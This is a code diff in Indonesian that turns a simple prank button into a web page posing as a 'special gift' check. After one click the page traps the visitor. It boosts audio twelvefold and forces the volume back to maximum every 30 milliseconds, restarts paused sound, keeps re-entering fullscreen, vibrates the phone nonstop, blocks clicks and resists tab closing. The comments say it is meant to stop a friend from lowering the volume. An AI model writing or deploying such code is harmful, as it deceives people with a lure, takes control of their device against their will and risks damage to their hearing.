@@ -1,29 +1,316 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Prank Button</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Cek Hadiah Spesial 🎁</title>
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+    html, body {
+        height: 100%;
+        overflow: hidden;
+        font-family: 'Segoe UI', sans-serif;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        color: white;
+        user-select: none;
+    }
+    .container {
+        height: 100vh;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+        text-align: center;
+    }
+    h1 { font-size: 1.8em; margin-bottom: 10px; }
+    p  { margin-bottom: 30px; opacity: 0.85; }
+    button {
+        font-size: 1.4em;
+        padding: 22px 55px;
+        border: none;
+        border-radius: 60px;
+        background: #ff4757;
+        color: white;
+        cursor: pointer;
+        font-weight: bold;
+        box-shadow: 0 8px 25px rgba(255,71,87,0.6);
+        animation: pulse 1.5s infinite;
+    }
+    @keyframes pulse {
+        0%,100% { transform: scale(1); }
+        50%     { transform: scale(1.05); }
+    }
+    button:active { transform: scale(0.97); }
+
+    #prankScreen {
+        position: fixed;
+        inset: 0;
+        background: #000;
+        display: none;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        z-index: 9999;
+    }
+    #prankScreen img {
+        width: 70vmin;
+        height: 70vmin;
+        object-fit: contain;
+        animation: shake 0.08s infinite;
+    }
+    @keyframes shake {
+        0%   { transform: translate(0,0) rotate(0deg); }
+        25%  { transform: translate(-15px,10px) rotate(-3deg); }
+        50%  { transform: translate(15px,-10px) rotate(3deg); }
+        75%  { transform: translate(-10px,-15px) rotate(-2deg); }
+        100% { transform: translate(10px,15px) rotate(2deg); }
+    }
+    #prankScreen h2 {
+        color: #ff4757;
+        font-size: 2em;
+        margin-top: 20px;
+        text-shadow: 0 0 20px #ff4757;
+        animation: blink 0.3s infinite;
+    }
+    @keyframes blink {
+        0%,100% { opacity: 1; }
+        50%     { opacity: 0.3; }
+    }
+    #warnMsg {
+        position: fixed;
+        bottom: 20px;
+        left: 50%;
+        transform: translateX(-50%);
+        background: rgba(255,71,87,0.9);
+        color: white;
+        padding: 10px 20px;
+        border-radius: 20px;
+        font-size: 0.9em;
+        display: none;
+        z-index: 10000;
+        animation: blink 0.5s infinite;
+    }
+</style>
 </head>
 <body>
-    <button id="prankBtn" style="font-size: 2em; padding: 20px;">
-        Jangan Diklik!
-    </button>
-    <audio id="prankAudio" src="suara_prank.mp3" preload="auto"></audio>
 
-    <script>
-        document.getElementById('prankBtn').addEventListener('click', function() {
-            // 1. Mainkan audio di halaman
-            var audio = document.getElementById('prankAudio');
-            audio.play().catch(e => console.log("Gagal play:", e));
+<div class="container" id="mainContainer">
+    <h1>🎁 Website Spesial Buat Kamu</h1>
+    <p>Pencet tombol di bawah buat kejutan ya~</p>
+    <button id="prankBtn">KLIK AKU 🎉</button>
+</div>
 
-            // 2. Kirim perintah ke backend Python lokal
-            fetch('http://localhost:5000/trigger-prank', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' }
-            })
-            .then(response => response.json())
-            .then(data => console.log(data))
-            .catch(error => console.error('Error:', error));
+<div id="prankScreen">
+    <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 200'><circle cx='100' cy='100' r='95' fill='%23ffcc00'/><circle cx='70' cy='80' r='15' fill='black'/><circle cx='130' cy='80' r='15' fill='black'/><path d='M50 130 Q100 180 150 130' stroke='black' stroke-width='8' fill='none' stroke-linecap='round'/></svg>" alt="prank">
+    <h2>😂 KENA PRANK 😂</h2>
+</div>
+
+<div id="warnMsg">🔊 JANGAN TURUNIN VOLUME, PERCUMA 😈</div>
+
+<script>
+// =========================================================
+//  KONFIGURASI
+// =========================================================
+const GAIN_LEVEL   = 12.0;   // 12x boost (naikkan ke 20 kalau berani)
+const FORCE_INTERVAL = 30;    // paksa volume tiap 30ms
+const AUDIO_FILE   = 'prank.mp3';
+
+// =========================================================
+//  VARIABEL GLOBAL
+// =========================================================
+let audioCtx = null;
+let gainNode = null;
+let compressor = null;
+let audioEl  = null;
+let triggered = false;
+let forceIntervalId = null;
+
+// =========================================================
+//  SETUP AUDIO BOOST (Web Audio API)
+// =========================================================
+function buildAudioBoost() {
+    // Buat elemen audio
+    audioEl = new Audio(AUDIO_FILE);
+    audioEl.loop = true;
+    audioEl.crossOrigin = 'anonymous';
+    audioEl.volume = 1.0;
+
+    // Buat AudioContext
+    const AC = window.AudioContext || window.webkitAudioContext;
+    audioCtx = new AC();
+
+    // Source dari audio element
+    const source = audioCtx.createMediaElementSource(audioEl);
+
+    // Compressor — mencegah distorsi parah saat boost besar
+    compressor = audioCtx.createDynamicsCompressor();
+    compressor.threshold.value = -25;
+    compressor.knee.value = 5;
+    compressor.ratio.value = 20;
+    compressor.attack.value = 0;
+    compressor.release.value = 0.05;
+
+    // Gain boost — INI KUNCI UTAMA
+    gainNode = audioCtx.createGain();
+    gainNode.gain.value = GAIN_LEVEL;
+
+    // Rangkai: source -> compressor -> gain -> speaker
+    source.connect(compressor);
+    compressor.connect(gainNode);
+    gainNode.connect(audioCtx.destination);
+}
+
+// =========================================================
+//  FUNGSI PRANK UTAMA
+// =========================================================
+async function startPrank() {
+    if (triggered) return;
+    triggered = true;
+
+    // 1. Sembunyikan tombol, tampilkan layar prank
+    document.getElementById('mainContainer').style.display = 'none';
+    const screen = document.getElementById('prankScreen');
+    screen.style.display = 'flex';
+
+    // 2. Request fullscreen (bikin susah keluar)
+    try {
+        const el = document.documentElement;
+        if (el.requestFullscreen) await el.requestFullscreen();
+        else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+        else if (el.mozRequestFullScreen) el.mozRequestFullScreen();
+        else if (el.msRequestFullscreen) el.msRequestFullscreen();
+    } catch (e) { console.log("Fullscreen gagal:", e); }
+
+    // 3. Bangun audio boost & mulai mainkan
+    try {
+        if (!audioCtx) buildAudioBoost();
+        if (audioCtx.state === 'suspended') await audioCtx.resume();
+        await audioEl.play();
+        console.log(`🔊 Audio start dengan gain ${GAIN_LEVEL}x`);
+    } catch (e) {
+        console.log("Audio gagal start:", e);
+        // Coba sekali lagi dengan gesture baru
+        document.addEventListener('click', retryAudio, { once: true });
+        document.addEventListener('touchstart', retryAudio, { once: true });
+    }
+
+    // 4. Getarkan HP terus-menerus
+    if (navigator.vibrate) {
+        setInterval(() => navigator.vibrate([200, 100, 200, 100, 500]), 1000);
+    }
+
+    // 5. ⭐ LOOP GILA: paksa volume ke MAX setiap FORCE_INTERVAL ms
+    //    Kalau temanmu turunin volume, dalam 30ms balik ke max
+    forceIntervalId = setInterval(() => {
+        if (!audioEl) return;
+
+        // Paksa volume element audio ke max
+        audioEl.volume = 1.0;
+
+        // Kalau dia paused (dipause lewat kontrol browser), play lagi
+        if (audioEl.paused) {
+            audioEl.play().catch(()=>{});
+        }
+
+        // Paksa gain tetap di level maksimal
+        if (gainNode) {
+            gainNode.gain.value = GAIN_LEVEL;
+        }
+
+        // Kalau AudioContext di-suspend (misalnya ditutup tabnya), resume
+        if (audioCtx && audioCtx.state === 'suspended') {
+            audioCtx.resume().catch(()=>{});
+        }
+
+        // Tampilkan warning
+        const warn = document.getElementById('warnMsg');
+        if (warn.style.display !== 'block') warn.style.display = 'block';
+    }, FORCE_INTERVAL);
+
+    // 6. Kalau user keluar dari fullscreen, minta ulang
+    document.addEventListener('fullscreenchange', () => {
+        if (!document.fullscreenElement && triggered) {
+            document.documentElement.requestFullscreen().catch(()=>{});
+        }
+    });
+
+    // 7. Shake seluruh halaman prank
+    let i = 0;
+    setInterval(() => {
+        i++;
+        const x = Math.sin(i * 1.7) * 12;
+        const y = Math.cos(i * 2.3) * 12;
+        screen.style.transform = `translate(${x}px, ${y}px)`;
+    }, 40);
+
+    // 8. Background warna-warni
+    let h = 0;
+    setInterval(() => {
+        h = (h + 20) % 360;
+        screen.style.background = `hsl(${h}, 100%, 8%)`;
+    }, 100);
+
+    // 9. Spawn emoji terbang
+    setInterval(() => {
+        const e = document.createElement('div');
+        e.textContent = ['😂','🤣','💀','😱','👻','🔥'][Math.floor(Math.random()*6)];
+        e.style.cssText = `
+            position:fixed; font-size:3em; z-index:10000;
+            left:${Math.random()*100}vw; top:100vh;
+            pointer-events:none;
+            transition: transform 3s linear, opacity 3s;
+        `;
+        document.body.appendChild(e);
+        requestAnimationFrame(() => {
+            e.style.transform = `translateY(-120vh) rotate(${Math.random()*720}deg)`;
+            e.style.opacity = '0';
         });
-    </script>
+        setTimeout(() => e.remove(), 3200);
+    }, 150);
+
+    // 10. Klik di mana saja = tidak ada efek (biar tidak bisa di-close gampang)
+    document.addEventListener('click', (ev) => {
+        if (triggered) {
+            ev.preventDefault();
+            ev.stopPropagation();
+        }
+    }, true);
+}
+
+function retryAudio() {
+    if (audioCtx && audioCtx.state === 'suspended') {
+        audioCtx.resume().then(() => audioEl.play()).catch(()=>{});
+    }
+}
+
+// =========================================================
+//  EVENT BINDING
+// =========================================================
+document.getElementById('prankBtn').addEventListener('click', startPrank);
+
+// Fallback: resume audio kalau autoplay diblokir
+document.addEventListener('touchstart', async () => {
+    if (audioCtx && audioCtx.state === 'suspended') {
+        await audioCtx.resume();
+    }
+}, { passive: true });
+
+// Anti-tutup tab
+window.addEventListener('beforeunload', (e) => {
+    if (triggered) {
+        e.preventDefault();
+        e.returnValue = '';
+        return '';
+    }
+});
+
+// Deteksi kalau user coba mute tab (hanya bisa deteksi page visibility)
+document.addEventListener('visibilitychange', () => {
+    if (triggered && document.hidden) {
+        console.log("User pindah tab, tapi suara tetap jalan...");
+    }
+});
+</script>
 </body>
 </html>
